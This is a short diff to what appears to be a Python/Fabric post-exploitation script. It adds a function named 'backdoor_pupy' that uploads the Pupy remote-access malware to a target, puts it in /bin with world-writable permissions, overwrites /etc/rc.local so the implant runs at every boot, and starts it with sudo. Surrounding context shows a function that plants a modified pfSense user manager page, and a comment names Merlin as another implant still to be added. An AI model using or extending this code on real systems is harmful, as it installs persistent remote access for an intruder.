@@ -32,5 +32,13 @@ def backdoor_pfsense_user(connect):
     connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")
 
 
+def backdoor_pupy(connect):
+    #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWARE
+    connect.put('UploadFiles/pupy')
+    connect.sudo('mv pupy /bin/')
+    connect.sudo('chmod 777 /bin/pupy')
+    connect.sudo('printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local')
+    connect.sudo('/bin/./pupy')
+
 
 #Up to implementation: merlin
